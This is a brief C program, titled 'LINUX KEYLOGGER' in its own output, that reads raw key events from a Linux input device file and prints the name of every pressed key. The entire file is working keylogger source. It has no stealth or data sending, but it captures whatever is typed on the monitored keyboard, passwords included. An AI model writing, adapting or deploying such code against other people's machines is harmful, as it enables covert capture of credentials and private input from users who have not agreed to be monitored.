#include <stdio.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <libevdev/libevdev.h>


int main(int argc, char *argv[]) 
{

    if (argc != 2) 
    {
        printf("Usage: %s <event-file-path>\n", argv[0]);
        return -1;
    }

    printf("LINUX KEYLOGGER\n");

    int fd = open(argv[1], O_RDONLY, 0);

    struct input_event ie;

    while (1)
    {         
        read(fd, &ie, sizeof(ie));

        if (ie.type != EV_KEY)
        {
            continue;
        }

        if (ie.value != 1)
        {
            continue;
        }

        printf("Key pressed: %s\n", libevdev_event_code_get_name(EV_KEY, ie.code));

    }

    return 0;
}
